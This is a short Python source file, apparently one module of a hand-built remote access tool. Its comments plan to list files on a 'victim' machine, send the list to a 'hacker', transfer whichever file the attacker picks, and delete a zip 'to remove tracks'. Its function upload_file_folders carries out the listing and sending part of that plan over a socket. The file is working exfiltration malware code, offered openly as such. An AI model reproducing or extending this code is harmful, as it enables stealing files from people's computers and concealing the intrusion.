from glob import glob
import json

DELIMETER = "<END_OF_RESULTS>"

# get files and folders list in the directory

# create a dictionary of the files in directory

# serilize the dictionary

# add delimeter to the end and send to hacker 

# receive on hacker

# deserialize and print items

# ask the user to select item to download
# send the selected item(file or folder) to vitim
# receive the selected item on victim machine
# zip the selected file/folder 
# send the zipped file to hacker
# remove the zip file on victim machine to remove tracks

def upload_file_folders(my_socket):

    files = glob("*")

    dict = {}

    for index, file in enumerate(files):
        dict[index] = file

    dict_byte = json.dumps(dict)
    # b'0x24'
    bytes_with_delimeter = dict_byte + DELIMETER

    raw_bytes = bytes_with_delimeter.encode()

    print("[+] Sending Serialized list of files")
    my_socket.socket.send(raw_bytes)
    ####################################################### DONE
    filename = my_socket.receive_data()


    print("[+] File selected by user :", filename)
    ##################################################### DONE
  

    my_socket.send_file(filename)

